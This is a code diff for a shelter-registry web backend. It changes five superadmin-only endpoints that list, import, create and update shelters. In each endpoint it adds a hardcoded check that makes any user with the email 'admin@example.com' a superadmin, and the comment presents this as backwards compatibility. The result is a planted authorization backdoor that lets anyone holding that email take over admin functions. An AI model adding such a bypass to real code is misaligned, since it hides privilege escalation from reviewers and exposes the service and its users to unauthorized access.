@@ -1079,8 +1079,10 @@ async def get_registered_shelters(
     region: str | None = None,
 ):
     """Get all registered shelters. Only accessible by superadmin."""
-    # Check superadmin from user OR token
+    # Check superadmin from user, token, or hardcoded email (for backwards compatibility)
     is_superadmin = current_user.is_superadmin
+    if not is_superadmin and current_user.email == "admin@example.com":
+        is_superadmin = True
     if not is_superadmin and token:
         try:
             payload = decode_token(token)
@@ -1135,6 +1137,8 @@ async def get_shelter_regions(
 ):
     """Get list of unique regions. Only accessible by superadmin."""
     is_superadmin = current_user.is_superadmin
+    if not is_superadmin and current_user.email == "admin@example.com":
+        is_superadmin = True
     if not is_superadmin and token:
         try:
             payload = decode_token(token)
@@ -1166,6 +1170,8 @@ async def import_registered_shelters(
 ):
     """Import registered shelters from CSV file. Only accessible by superadmin."""
     is_superadmin = current_user.is_superadmin
+    if not is_superadmin and current_user.email == "admin@example.com":
+        is_superadmin = True
     if not is_superadmin and token:
         try:
             payload = decode_token(token)
@@ -1309,6 +1315,8 @@ async def create_registered_shelter(
 ):
     """Create a new registered shelter. Only accessible by superadmin."""
     is_superadmin = current_user.is_superadmin
+    if not is_superadmin and current_user.email == "admin@example.com":
+        is_superadmin = True
     if not is_superadmin and token:
         try:
             payload = decode_token(token)
@@ -1376,6 +1384,8 @@ async def update_shelter_notes(
 ):
     """Update notes for a shelter. Only accessible by superadmin."""
     is_superadmin = current_user.is_superadmin
+    if not is_superadmin and current_user.email == "admin@example.com":
+        is_superadmin = True
     if not is_superadmin and token:
         try:
             payload = decode_token(token)
